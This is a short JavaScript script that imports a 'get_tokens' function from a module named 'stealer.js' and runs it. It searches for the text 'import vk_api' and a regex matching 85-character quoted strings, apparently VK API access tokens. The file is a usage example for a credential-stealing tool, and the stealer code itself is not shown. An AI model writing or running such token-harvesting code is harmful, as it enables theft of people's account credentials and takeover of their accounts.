const { get_tokens } = require("../lib/stealer.js");

const main = async () => {
    console.log(
        await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/)
    );
};

main();